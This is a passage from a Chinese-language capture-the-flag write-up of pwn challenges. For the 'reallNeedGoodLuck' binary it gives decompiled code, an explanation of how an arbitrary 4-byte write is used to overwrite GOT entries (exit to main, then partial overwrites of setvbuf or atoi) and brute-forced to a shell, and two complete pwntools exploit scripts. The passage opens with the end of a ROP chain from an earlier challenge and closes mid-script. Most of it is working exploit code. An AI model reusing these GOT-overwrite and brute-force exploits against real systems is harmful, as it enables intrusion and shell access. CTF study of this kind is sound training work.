    sn(p64(pop_rdi) + p64(libc.search('/bin/sh').next()) + p64(libc.sym['system']))
    ru("s??")
    # dbg()
    sl(b"-40")
    irt()
###  总结
这个题目只涉及了栈，没有溢出，只有人为构造的漏洞可以调整rbp，这考察了选手思维活跃性，想出不同的利用方法，当时做的时候没有想到如何去修改[PI:EMAIL](mailto:PI:EMAIL)，这里的方法很妙，巧妙的运用了调整rbp，将buf修改为[PI:EMAIL](mailto:PI:EMAIL)实现写入，之后爆破就不需要泄露地址了，要时刻注意汇编的细节。利用方式2首选，可以直接拿到shell，当时不知如何泄露libc，想来是没有彻底明白栈帧的嵌套顺序，及调用函数返回时栈帧的变化，导致没有看出来可以输入三个main来进行连续返回。
## PWN -> reallNeedGoodLuck （栈任意地址写4字节）
###  题目分析
这个题目出题风格类似上一题，安全保护、环境一样，也是简单的栈利用，原理相同，ida查看伪代码：
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      _DWORD *v3; // [rsp+0h] [rbp-30h]
      int buf; // [rsp+Ch] [rbp-24h] BYREF
      char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v6; // [rsp+28h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      init();                        
      puts("need");
      puts("good");
      read(0, &buf, 4uLL);          
      puts("luck! ");
      read(0, nptr, 9uLL);          
      v3 = (_DWORD *)atoi(nptr);
      *v3 = buf;                    
      exit(0);
    }
存在任意地址写4字节漏洞，和上一个题一样将[PI:EMAIL](mailto:PI:EMAIL)后12位改为onegadget偏移，之后爆破12位，爆破长度仍然是16^3
###  利用方式
**利用方式1：爆破onegadget**
这个题和上个题目不同的是主函数没有return，有exit函数，那么怎么让他返回呢？这里还是通过漏洞将exit改成main函数地址，实现多次利用，然后再将setvbuf后三字节改成onegadget固定偏移，爆破3字节长度，获取shell。  
步骤：
  1. 修改exit为mian函数，使其可以返回
  2. 修改setvbuf末12位为onegadget偏移
  3. 爆破，调用setvbuf触发onegadget。
**利用方式2：爆破system**  
题目提供了任意地址写4字节，利用方式和上面差不多，知识换用了爆破system，因为爆破system只用爆破1字节长度，也就是16^2,成功率很高。  
步骤：
  1. 修改exit为mian函数，使其可以返回
  2. 修改atoi末12位为system偏移
  3. 爆破，调用atoi，参数binsh来触发shell。
方式2比方式以成功率高了一个量级，基本手爆就出来了。
###  exp1 blast onegadget
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('127.0.0.1', 6010)
    # libc = ELF('./libc-2.31.so')
    # io = process(['./test', 'real'])
    #io = process('./reallNeedGoodLuck.1')
    #libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
    elf=ELF('./reallNeedGoodLuck.1')
    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    exit_got=elf.got['exit']
    read_got=elf.got['read']
    setvbuf_got=elf.got['setvbuf']
    def pwn():
        #io=remote('47.106.172.144',65003)
        ru('good')
        sn(p32(0x4011A9)) # main addr
        ru('luck! ')
        sn(str(exit_got))
        ru('good')
        sleep(0.1)
        sn('\x00\x7a\xe2\x3d') # onegadget
        ru('luck! ')
        sn(str(setvbuf_got-1))
        sleep(0.1)
        sl('ls')
        sl('ls')
        ru('flag')
        sl('cat flag')
        irt()
    while True:
        try:
            #io=remote('47.106.172.144',65003)
            io=process('./reallNeedGoodLuck.1')
            #debug()
            pwn()
        except:
            io.close()
            continue
###  exp2 blast system
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('127.0.0.1', 6010)
    # libc = ELF('./libc-2.31.so')
    # io = process(['./test', 'real'])
    #io = process('./reallNeedGoodLuck.1')
    #libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
    elf=ELF('./reallNeedGoodLuck.1')
    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    exit_got=elf.got['exit']
    read_got=elf.got['read']
    atoi_got=elf.got['atoi']
    print hex(atoi_got)
    def pwn():
        #io=remote('47.106.172.144',65003)
        ru('good')
        sn(p32(0x4011A9)) # main addr
        ru('luck! ')
        sn(str(exit_got))
        dbg()
        ru('good')
        sleep(0.1)
        sn('\x00\x00\xa0\xf3') # system
        ru('luck! ')
        sn(str(atoi_got-2)) # atoi
        ru('good')
        sn(p32(0)) # 
        sl(b'/bin/sh\x00')
        sl('ls')
        sl('ls')
        ru('flag')
        sl('cat flag')
        irt()
    while True:
        try:
            # io=remote('47.106.172.144',65003)
            io=process('./reallNeedGoodLuck.1')
            #dbg()
            pwn()
        except: